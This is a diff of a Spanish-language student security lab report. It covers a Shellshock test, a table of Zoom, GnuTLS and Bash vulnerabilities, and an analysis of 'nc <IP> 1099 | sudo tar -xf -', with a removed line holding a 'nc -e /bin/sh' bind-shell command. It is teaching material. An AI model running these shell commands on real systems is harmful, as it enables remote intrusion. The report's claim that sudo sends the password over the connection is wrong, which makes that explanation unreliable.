@@ -20,7 +20,7 @@
 
 \item La direcci\'on IP de la m\'aquina virtual Kali en este caso es 192.168.1.155 (Bridged).
 \item La direcci\'on IP de la m\'aquina virtual OWASP en este caso es 192.168.1.133 (Bridged).\\
-Tras ejecutar \textbf{env x='() \{ :;\}; echo vulnerable' bash -c "echo test"} vemos que es vulnerable a Shellshock.
+Tras ejecutar \textbf{env x='() \{ :;\}; echo vulnerable' bash -c "echo test"} vemos que la computadora es vulnerable a Shellshock.
 \item Luego de ejecutar todas las instrucciones mostradas, se procede a modificar el c\'odigo para poder asi, con ayuda de netcat, conseguir una reverse shell.
 \begin{center}
 \includegraphics[scale=.6]{codigo.png}\\
@@ -39,15 +39,14 @@ Cual es el riesgo? & RCE (remote code execution: execute arbitrary code on victi
 \hline
 Requerimientos para la explotaci\'on & Tener instalado Zoom en Windows 7 y realizar una accion tipica, como abrir un documento. & Tener GnuTLS con versiones entre la 3.6.4 $<$ 3.6.14. & GNU Bash 1.14 $<$ 4.3\\
 \hline
-Como mitigar la vulnerabilidad? & Se podria considerar la posibilidad de instalar el parche de 0patch aunque, si bien es reconocido internacionalmente, aplicar parches desconocidos a binarios de Windows no me parece una buena idea. De todas maneras, Zoom saco una nueva version en donde arreglan este error al dia siguiente, por lo que actualizar el programa solucionaria esta vulnerabilidad. & Actualizar. & Actualizar Bash\\
+Como mitigar la vulnerabilidad? & Se podria considerar la posibilidad de instalar el parche de 0patch aunque aplicar parches desconocidos a binarios de Windows no me parece una buena idea. De todas maneras, Zoom sac\'o una nueva versi\'on en donde arreglan este error, al dia siguiente, por lo que actualizar el programa solucionar\'ia esta vulnerabilidad. & Actualizar. & Actualizar Bash\\
 \hline
 \end{tabular}
 \end{center}
 \end{table}
+\item El diccionario con los aliases se llama ekoparty.txt.
 
-\item El diccionario con los aliases se llama ekoparty.txt. Adem\'as, se agregan los nombres completos de las personas en un archivo aparte.
-
-\item Para analizar el comando \textbf{nc 143.0.100.198 1099 $|$ sudo tar -xf -} comenzaremos con la parte de netcat, es decir, nc. Esto se usa generalmente para crear una bind shell, donde el atacante se conecta a la victima con IP 143.0.100.198 al puerto 1099. En la victima se deberia ejecutar \textit{nc -nlvp 1099 -e /bin/sh}. Luego, la salida de este comando se redirecciona al comando tar, el cual con los parametos xf extrae un archivo ???? 
+\item Para analizar el comando \textbf{nc 143.0.100.198 1099 $|$ sudo tar -xf -} comenzaremos con la parte de netcat, es decir, \textbf{nc}. Esto se usa para crear una conexi\'on con el puerto 1099 de la IP nombrada. Por otro lado, el comando \textbf{tar -xf -} extrae un archivo, el - ordena que se use el archivo que se pasa por el pipe. Es decir, se crea una conexi\'on, y cuando se recibe un archivo, se lo descomprime. Pero no termina ahi, porque falta la palabra sudo. La palabra sudo hace que se pida la contrase\~na del usuario, y cuando se la escribe, no solamente se usa para descomprimir el archivo (o intento de archivo, porque no se le puede pasar nada), sino que se envia al chat, por lo que cualquier persona escuchando podria hacerse con las credenciales.
 
 
 \end{enumerate}
